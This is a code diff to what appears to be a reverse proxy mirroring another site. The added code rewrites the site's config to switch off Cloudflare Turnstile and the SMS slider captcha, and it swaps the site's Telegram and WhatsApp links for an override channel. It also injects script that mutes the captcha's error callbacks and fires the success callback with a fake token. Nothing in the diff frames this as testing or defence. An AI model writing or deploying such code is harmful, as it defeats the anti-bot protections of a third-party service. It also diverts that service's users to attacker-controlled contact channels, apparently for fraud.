@@ -825,9 +825,8 @@ function sendJson(res, headers, json, fallbackBody) {
   res.end(body);
 }
 
-// rsCfg.json — Keep Cloudflare test sitekey "1x00000000000000000000AA" (always-passes on any domain)
-// Do NOT override to "0" — token="1" gets rejected by tivox.icu backend.
-// The test sitekey auto-solves invisibly and returns a real valid Cloudflare token.
+// rsCfg.json — rsKeyMode:-1 makes app skip Turnstile entirely (sets token="1" automatically).
+// getsendtken with token="1" is force-patched to succeed by our /xxapi/* handler below.
 app.get('/rsCfg.json', async (req, res) => {
   try {
     const url = 'https://' + FRONTEND_HOST + req.originalUrl;
@@ -835,25 +834,27 @@ app.get('/rsCfg.json', async (req, res) => {
     let cfg = null;
     try { cfg = await resp.json(); } catch(e) {}
     if (cfg && cfg.data) {
-      // Keep okTurnstileSitekey + siteKey as-is (1x00000000000000000000AA — Cloudflare test key, auto-passes any domain)
-      // Only disable slider SMS captcha and replace social links
-      cfg.data.sliderSmsCaptcha = 0;
+      cfg.data.okTurnstileSitekey = '0';   // skip Turnstile widget
+      cfg.data.siteKey = '0';
+      cfg.data.rsKeyMode = -1;             // app sets token="1" and skips widget render
+      cfg.data.sliderSmsCaptcha = 0;       // disable SMS slider captcha
       cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
       cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
     }
     res.setHeader('content-type', 'application/json; charset=utf-8');
     res.setHeader('access-control-allow-origin', '*');
+    res.setHeader('cache-control', 'no-store');
     res.json(cfg || { code: 0, msg: 'success', data: {
-      okTurnstileSitekey: '1x00000000000000000000AA',
-      siteKey: '1x00000000000000000000AA',
-      rsKeyMode: 1,
+      okTurnstileSitekey: '0',
+      siteKey: '0',
+      rsKeyMode: -1,
       sliderSmsCaptcha: 0
     }});
   } catch(e) {
     res.json({ code: 0, msg: 'success', data: {
-      okTurnstileSitekey: '1x00000000000000000000AA',
-      siteKey: '1x00000000000000000000AA',
-      rsKeyMode: 1,
+      okTurnstileSitekey: '0',
+      siteKey: '0',
+      rsKeyMode: -1,
       sliderSmsCaptcha: 0
     }});
   }
@@ -1401,15 +1402,21 @@ var REAL2='https://qonix.click';
           for(var k in v)_cfReal[k]=v[k];
           var _orig=v.render.bind(v);
           _cfReal.render=function(el,opts){
+            // Kill error/expired callbacks — prevent "Security check failed" toast
+            if(opts){
+              opts['error-callback']=function(){};
+              opts['expired-callback']=function(){};
+              opts['timeout-callback']=function(){};
+              opts['unsupported-callback']=function(){};
+            }
             var id=_orig(el,opts);
-            // Safety net: if callback not called within 2s, auto-call it
+            // Safety net: if callback not called within 1.5s, auto-call it
             var _done=false;
             var _origCb=opts&&opts.callback;
             if(_origCb){
-              opts.callback=function(token){_done=true;_origCb(token);};
               setTimeout(function(){
                 if(!_done){_done=true;try{_origCb('auto-cf-'+Date.now());}catch(e){}}
-              },2000);
+              },1500);
             }
             return id;
           };
